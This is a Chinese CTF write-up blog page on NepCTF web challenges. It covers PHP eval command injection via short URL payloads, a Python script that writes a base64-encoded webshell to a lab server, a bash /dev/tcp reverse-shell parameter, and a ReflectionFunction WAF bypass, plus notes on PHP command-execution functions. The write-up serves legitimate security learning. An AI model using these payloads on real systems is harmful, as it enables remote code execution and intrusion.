@@ -1,0 +1,241 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>nepctf复现 - 月出从云</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="Little_trick这道题目限制的很死，但是这种题目之前就做过了，可以通过写入文件的方式来读取flag的 。
+1234567891011&amp;lt;?php    error_reporting(0,"> 
+    
+    <link rel="alternative" href="atom.xml" title="月出从云" type="application/atom+xml"> 
+    <link rel="icon" href="/img/1.ico"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">月出从云</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">nepctf复现</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">nepctf复现</h1>
+        <div class="stuff">
+            <span>三月 24, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/FastJson/" rel="tag">FastJson</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/Java/" rel="tag">Java</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/PHP/" rel="tag">PHP</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h1 id="Little-trick"><a href="#Little-trick" class="headerlink" title="Little_trick"></a>Little_trick</h1><p>这道题目限制的很死，但是这种题目之前就做过了，可以通过写入文件的方式来读取flag的 。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    $nep = $_GET[<span class="string">&#x27;nep&#x27;</span>];</span><br><span class="line">    $len = $_GET[<span class="string">&#x27;len&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(intval($len)&lt;<span class="number">8</span> &amp;&amp; strlen($nep)&lt;<span class="number">13</span>)&#123;</span><br><span class="line">        <span class="keyword">eval</span>(substr($nep,<span class="number">0</span>,$len));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too long!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210324191420028.png" alt="image-20210324191420028"></p>
+<p>故通过：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?nep&#x3D;&#96;ls&gt;z&#96;;&amp;len&#x3D;7</span><br><span class="line">?nep&#x3D;&#39;&gt;cat&#39;;&amp;len&#x3D;7</span><br><span class="line">?nep&#x3D;&#39;*&gt;z&#39;;&amp;len&#x3D;7</span><br></pre></td></tr></table></figure>
+
+<p>这里还有第二个解：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">?nep&#x3D;&#96;$nep&#96;;ls&gt;z&amp;len&#x3D;7</span><br><span class="line">?nep&#x3D;&#96;$nep&#96;;&gt;cat&amp;len&#x3D;7</span><br><span class="line">?nep&#x3D;&#96;$nep&#96;;*&gt;z&amp;len&#x3D;7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?nep&#x3D;&#96;$nep&#96;;ls&gt;z&amp;len&#x3D;7 </span><br><span class="line">&#x2F;&#x2F; 得到目录下文件名</span><br><span class="line">?nep&#x3D;&#96;$nep&#96;;&gt;cat&amp;len&#x3D;7</span><br><span class="line">&#x2F;&#x2F; 生成文件名为cat的文件</span><br><span class="line">?nep&#x3D;&#96;$nep&#96;;*&gt;z&amp;len&#x3D;7</span><br><span class="line">输入通配符*，Linux会把第一个列出的文件名当作命令，剩下的文件名当作参数。</span><br><span class="line">最后访问文件z即可。</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里其实len=7能做出来应该并非是出题人的本愿，实际上出题人应该是想让人令len=-1</p>
+<p>在php中的测试：</p>
+<p><img src="image-20210324193126060.png" alt="image-20210324193126060"></p>
+<p>解法三没见过：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">p = <span class="string">r&#x27;&#x27;&#x27;&gt;hp</span></span><br><span class="line"><span class="string">&gt;1.p\\</span></span><br><span class="line"><span class="string">&gt;d\&gt;\\</span></span><br><span class="line"><span class="string">&gt;\ -\\</span></span><br><span class="line"><span class="string">&gt;e64\\</span></span><br><span class="line"><span class="string">&gt;bas\\</span></span><br><span class="line"><span class="string">&gt;7\|\\</span></span><br><span class="line"><span class="string">&gt;XSk\\</span></span><br><span class="line"><span class="string">&gt;Fsx\\</span></span><br><span class="line"><span class="string">&gt;dFV\\</span></span><br><span class="line"><span class="string">&gt;kX0\\</span></span><br><span class="line"><span class="string">&gt;bCg\\</span></span><br><span class="line"><span class="string">&gt;XZh\\</span></span><br><span class="line"><span class="string">&gt;AgZ\\</span></span><br><span class="line"><span class="string">&gt;waH\\</span></span><br><span class="line"><span class="string">&gt;PD9\\</span></span><br><span class="line"><span class="string">&gt;o\ \\</span></span><br><span class="line"><span class="string">&gt;ech\\</span></span><br><span class="line"><span class="string">ls -t&gt;0</span></span><br><span class="line"><span class="string">sh 0&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.130.128:10110/47c87ab02c7cac57165d0c568f0542bc/?nep=&#123;&#125;&amp;len=-1&quot;</span></span><br><span class="line">print(<span class="string">&quot;[+]start attack!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> p.split(<span class="string">&#x27;\n&#x27;</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    payload = <span class="string">&#x27;`&#x27;</span> + i.strip() + <span class="string">&#x27;`;;&#x27;</span></span><br><span class="line">    print(<span class="string">&quot;[*]&quot;</span> + url.<span class="built_in">format</span>(payload))</span><br><span class="line">    requests.get(url.<span class="built_in">format</span>(payload))</span><br></pre></td></tr></table></figure>
+
+<p>通过注入的方式把文件写进去</p>
+<p>解法4更加易懂：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?nep&#x3D;&#96;$_GET[1]&#96;;;&amp;len&#x3D;-1&amp;1&#x3D;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;10110 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<h1 id="easy-tomcat"><a href="#easy-tomcat" class="headerlink" title="easy_tomcat"></a>easy_tomcat</h1><p>跟VNCTF哪个一样，但是这里咋都弹不出来，先pass</p>
+<h1 id="bbxhh-revenge"><a href="#bbxhh-revenge" class="headerlink" title="bbxhh_revenge"></a>bbxhh_revenge</h1><p>这题前面感觉就是🤢</p>
+<p>最后一步这里感觉还是相当有趣的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$s</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> preg_replace(<span class="string">&#x27;/sys|exec|sh|flag|pass|file|open|dir|2333|;|#|\/\/|&gt;/i&#x27;</span>, <span class="string">&quot;NepnEpneP&quot;</span>, $s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">	$_ = waf($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">	$__ = waf($_GET[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line">	$a = <span class="keyword">new</span> $_($__);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	$a = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;?&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;d&#x27;</span>]))&#123;</span><br><span class="line">	$c = waf($_GET[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line">	$d = waf($_GET[<span class="string">&#x27;d&#x27;</span>]);</span><br><span class="line">	<span class="keyword">eval</span>(<span class="string">&quot;\\<span class="subst">$a</span>-&gt;<span class="subst">$c</span>(<span class="subst">$d</span>);&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	$c = <span class="string">&quot;getMessage&quot;</span>;</span><br><span class="line">	$d = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">eval</span>(<span class="string">&quot;echo \\<span class="subst">$a</span>-&gt;<span class="subst">$c</span>(<span class="subst">$d</span>);&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>出题人说是考察了原生反射的机制（感觉这段时间全都是PHP原生类？），可以去搜一下ReflectionFunction类，利用invokArgs操作，实际上就相当于使用了call_usr_func</p>
+<p>出题人的payload：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?a=ReflectionFunction&amp;b=call_user_func&amp;c=invokeArgs&amp;d=array(%27assert%27,%27s%27.%27how_source(\%27/f\%27.\%27lag\%27)%27)</span><br></pre></td></tr></table></figure>
+
+<p>感觉自己总是不太明白call_user_func能做什么，这里总结一下：</p>
+<p>首先书写例子：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$a = $_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$b = $_GET[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> call_user_func($a,$b);</span><br></pre></td></tr></table></figure>
+
+<p>经过测试，call_user_func 常用的函数如下：</p>
+<h2 id="1-file-get-contents"><a href="#1-file-get-contents" class="headerlink" title="1.file_get_contents"></a>1.file_get_contents</h2><p>这个倒是很好理解：</p>
+<p><img src="image-20210324205352364.png" alt="image-20210324205352364"></p>
+<p>但是同时要注意的有如下细节：</p>
+<h3 id="1-该函数允许使用伪协议"><a href="#1-该函数允许使用伪协议" class="headerlink" title="1.该函数允许使用伪协议"></a>1.该函数允许使用伪协议</h3><p><img src="image-20210324205501930.png" alt="image-20210324205501930"></p>
+<h3 id="2-该函数允许file-协议等等，所以你可以这样操作："><a href="#2-该函数允许file-协议等等，所以你可以这样操作：" class="headerlink" title="2.该函数允许file://协议等等，所以你可以这样操作："></a>2.该函数允许file://协议等等，所以你可以这样操作：</h3><p><img src="image-20210324205545033.png" alt="image-20210324205545033"></p>
+<p>肯定也支持http协议的啦</p>
+<p><img src="image-20210324205632136.png" alt="image-20210324205632136"></p>
+<p>但是要注意，file_get_contents该函数并不会自带回显，所以该函数只能用于使用有输出的情况</p>
+<h2 id="2-assert-7-0版本才可以使用"><a href="#2-assert-7-0版本才可以使用" class="headerlink" title="2.assert 7.0版本才可以使用"></a>2.assert 7.0版本才可以使用</h2><p>可以直接命令执行，感觉没啥好说的</p>
+<h2 id="3-system"><a href="#3-system" class="headerlink" title="3.system"></a>3.system</h2><p>可以直接执行命令了，但是感觉大部分情况也会被ban掉，但是awd说不定用得上呢</p>
+<h2 id="4-exec"><a href="#4-exec" class="headerlink" title="4.exec"></a>4.exec</h2><p>和system是一样的，但是需要手动的输出出来</p>
+<p><img src="image-20210325135738567.png" alt="image-20210325135738567"></p>
+<p><img src="image-20210325135754393.png" alt="image-20210325135754393"></p>
+<h2 id="5-shell-exec"><a href="#5-shell-exec" class="headerlink" title="5.shell_exec"></a>5.shell_exec</h2><p>和exec同理，但是两者之间又有区别。首先两者都需要echo 的输出，但是shell_exec的起点就是当前目录，而exec的起点为之前的目录，故两者间还是有区别的</p>
+<h2 id="6-passthru"><a href="#6-passthru" class="headerlink" title="6.passthru"></a>6.passthru</h2><p>可以用于读取图片？</p>
+<p>不需要echo自己就有回显了</p>
+<p><img src="image-20210325140051160.png" alt="image-20210325140051160"></p>
+<h2 id="7-pcntl-exec"><a href="#7-pcntl-exec" class="headerlink" title="7.pcntl_exec"></a>7.pcntl_exec</h2><p>不是很好用，这个需要执行参数执行命令，例子：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> pcntl_exec(“/bin/bash”, <span class="keyword">array</span>(“/tmp/b4dboy.sh”));<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#/tmp/b4dboy.sh</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">ls -l /</span><br><span class="line"></span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+<p>但是该函数在7.0已经默认被ban掉了所以并不好用</p>
+<p>其他函数命令执行函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ob_start()、unserialize()、creat_function()</span><br><span class="line">usort()、uasort()、uksort()</span><br><span class="line">array_filter()</span><br><span class="line">array_reduce()</span><br><span class="line">array_map()</span><br></pre></td></tr></table></figure>
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r='https://github.com/ysllz/ysllz.github.io'
+        data-o='https://github.com/ysllz/ysllz.github.io'
+        data-a='ysllz'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Little-trick"><span class="toc-number">1.</span> <span class="toc-text">Little_trick</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easy-tomcat"><span class="toc-number">2.</span> <span class="toc-text">easy_tomcat</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#bbxhh-revenge"><span class="toc-number">3.</span> <span class="toc-text">bbxhh_revenge</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-file-get-contents"><span class="toc-number">3.1.</span> <span class="toc-text">1.file_get_contents</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%AF%A5%E5%87%BD%E6%95%B0%E5%85%81%E8%AE%B8%E4%BD%BF%E7%94%A8%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">3.1.1.</span> <span class="toc-text">1.该函数允许使用伪协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%AF%A5%E5%87%BD%E6%95%B0%E5%85%81%E8%AE%B8file-%E5%8D%8F%E8%AE%AE%E7%AD%89%E7%AD%89%EF%BC%8C%E6%89%80%E4%BB%A5%E4%BD%A0%E5%8F%AF%E4%BB%A5%E8%BF%99%E6%A0%B7%E6%93%8D%E4%BD%9C%EF%BC%9A"><span class="toc-number">3.1.2.</span> <span class="toc-text">2.该函数允许file:&#x2F;&#x2F;协议等等，所以你可以这样操作：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-assert-7-0%E7%89%88%E6%9C%AC%E6%89%8D%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8"><span class="toc-number">3.2.</span> <span class="toc-text">2.assert 7.0版本才可以使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-system"><span class="toc-number">3.3.</span> <span class="toc-text">3.system</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-exec"><span class="toc-number">3.4.</span> <span class="toc-text">4.exec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-shell-exec"><span class="toc-number">3.5.</span> <span class="toc-text">5.shell_exec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-passthru"><span class="toc-number">3.6.</span> <span class="toc-text">6.passthru</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-pcntl-exec"><span class="toc-number">3.7.</span> <span class="toc-text">7.pcntl_exec</span></a></li></ol></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
